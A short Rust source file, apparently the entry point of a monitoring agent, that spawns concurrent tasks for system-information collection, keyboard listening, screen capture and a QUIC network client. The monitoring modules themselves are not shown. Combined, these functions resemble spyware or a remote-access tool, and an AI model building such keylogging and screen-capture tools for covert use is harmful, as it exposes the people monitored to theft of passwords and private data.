use tokio::sync::mpsc::Sender;
use anyhow::{Result, Ok};

use crate::{app, bootstrap};
use bootstrap::app_state::MainEnum;
use app::{
    service::quic,
    core::{
        screen_capture::screen_capture_logic,
        keyboard_listen::keyboard_listen_logic,
        system_info::system_info_logic
    }
};

pub async fn use_thread(sender: Sender<MainEnum>) -> Result<()> {
    let system_info_sender = sender.clone();
    let keyboard_listen_sender = sender.clone();
    // let screen_capture_sender = sender.clone();

    // 系统信息
    let system_info_handle = tokio::spawn(async move {
        system_info_logic::get_info(system_info_sender).await;
    });

    // 键盘监控
    let keyboard_handle = tokio::spawn(async move {
        keyboard_listen_logic::listen(keyboard_listen_sender).await;
    });

    // 屏幕监控
    let screen_handle = tokio::spawn(async move {
        screen_capture_logic::take().await;
    });

    // quic 客户端
    let quic_handle = tokio::spawn(async move {
        quic::client::run().await
            .map_err(|e| println!("Error: {:#?}", e))
            .ok();
    });

    system_info_handle.await?;
    keyboard_handle.await?;
    screen_handle.await?;
    quic_handle.await?;

    Ok(())
}